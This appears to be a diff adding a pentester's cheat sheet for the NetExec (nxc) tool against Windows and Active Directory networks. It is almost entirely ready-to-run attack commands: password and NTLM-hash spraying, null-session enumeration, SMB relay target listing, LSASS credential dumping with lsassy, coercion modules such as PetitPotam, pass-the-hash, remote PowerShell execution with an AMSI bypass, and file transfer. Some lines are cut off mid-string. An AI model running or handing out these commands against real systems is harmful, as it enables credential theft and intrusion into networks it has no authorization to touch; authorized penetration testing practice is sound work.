@@ -1,0 +1,186 @@
+### target format 
+netexec <protocol> domain.name
+netexec <protocol> 10.10.0.1 10.10.0.2
+netexec <protocol> 10.10.0.1/24
+netexec <protocol> 10.10.0.0-28 192.168.0.1-34
+netexec <protocol> ~/target.txt
+
+Protocol	See Pwn3d! in output
+FTP No check 
+
+SSH root (otherwise specific message) ✅
+
+WINRM Code execution at least 👾
+
+LDAP Path to domain admin 👑
+
+SMB Most likely local admin ✅
+
+RDP Code execution at least 👾
+
+VNC Code execution at least 👾
+
+WMI Most likely local admin ✅
+
+# username and passwords spraying
+
+netexec <protocol> <target(s)> -u username1 -p password1 password2
+netexec <protocol> <target(s)> -u username1 username2 -p password1
+netexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
+netexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
+
+#By default nxc will exit after a successful login is found. 
+#Using the --continue-on-success flag will continue spraying
+# even after a valid password is found. Usefull for spraying
+# a single password against a large user list. 
+#The --continue-on-success flag is incompatible with 
+#command execution.
+
+# protocols modules
+nxc smb -L # lists all the module available
+
+nxc <protocol> <target(s)> -M <module-name> 
+
+# e.g. run SMB mimikatz module
+nxc smb <target(s)> -u Administrator -p 'October2022' -M lsassy
+
+# Run nxc <protocol> -M <module name> --options to view a modules supported options, e.g:
+nxc smb -M lsassy --options
+
+# using -o to add option to a module 
+nxc <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M lsassy -o COMMAND=xxxxxxxxug'
+
+# run multiple modules
+nxc <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M spooler -M printnightmare -M shadowcoerce -M petitpotam
+
+### Enumeration
+
+# enum hosts
+nxc smb 10.10.10.1/24
+
+# enum Null Sessions
+nxc smb 10.10.10.161 -u '' -p ''
+nxc smb 10.10.10.161 -u '' -p '' --shares
+nxc smb 10.10.10.161 -u '' -p '' --pass-pol
+nxc smb 10.10.10.161 -u '' -p '' --users
+nxc smb 10.10.10.161 -u '' -p '' --groups
+
+smbclient -N -U "" -L \\10.10.10.161
+
+# Enumerate Guest Logon
+
+nxc smb 10.10.10.178 -u 'a' -p '' 
+nxc smb 10.10.10.178 -u 'a' -p '' --shares
+
+# Enumerate Hosts with SMB Signing Not Required
+#Maps the network of live hosts and saves a list of only the hosts that don't require SMB signing.
+#List format is one IP per line
+
+nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt
+
+# enum Active Sessions
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sessions
+
+#ENum shares and access
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
+
+# filter only by readable writable share
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares --filter-shares READ WRITE
+
+# Enumerate Network Interfaces
+#You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
+
+# Enumerate network interfaces on a host:
+nxc smb 192.168.56.11 -u USERNAME -p 'PASSWORDHERE' --interfaces
+
+#Enumerate Disks
+#Enumerate disks on the remote target
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks
+
+# enum logged on users
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users
+
+#enum Domain users 
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users
+
+#enum domain groups
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --groups
+
+#enum local groups
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-group
+
+#enum passwd policy
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
+
+#User/Hash
+#After obtaining credentials such as
+#Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
+#you can use both the full hash or just the nt hash (second half)
+
+
+#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
+#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
+#~ nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
+#~ nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc
+
+#Checking Credentials (Local)
+#User/Password/Hashes
+#Adding --local-auth to any of the authentication commands with attempt to logon locally.
+
+nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-auth
+nxc smb 192.168.1.0/24 -u '' -p '' --local-auth
+nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --local-auth
+nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH' --local-auth
+nxc smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
+nxc smb 192.168.1.0/24 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
+#Results will display the hostname next to the user:password
+
+#Executing Remote Commands
+#Command Execution
+#Executing commands on a windows system requires Administrator credentials.
+
+#nxc automatically tells you if the credential set you're using has admin access to a host by appending "(Pwn3d!)" (or whatever value you've set in the config) to the output when authentication is successful.
+
+#Execution Methods
+#nxc has three different command execution methods:
+
+#wmiexec executes commands via WMI
+
+#atexec executes commands by scheduling a task with windows task scheduler
+
+#smbexec executes commands by creating and running a service
+
+#By default nxc will fail over to a different execution method if one fails. It attempts to execute commands in the following order:
+
+wmiexec
+
+atexec
+
+smbexec
+
+#If you want to force nxc to use only one execution method you can specify which one using the --exec-method flag.
+
+#Executing Commands
+#In the following example, we try to execute whoami on the target using the -x flag:
+
+#You can also directly execute PowerShell commands using the -X flag:
+
+nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
+
+#Bypass AMSI
+
+nxc smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload
+
+#Get and Put Files
+#Get a remote file or send a remote file using NetExec
+
+#Send a File to the Remote Target
+#Send a local file to the remote target
+
+nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
+
+#Get a File From the Remote Target
+#Get a remote file on the remote target
+nxc smb 172.16.251.152 -u user -p pass --get-file  \\Windows\\Temp\\whoami.txt /tmp/whoami.t
+
+https://www.netexec.wiki/smb-protocol/obtaining-credentials
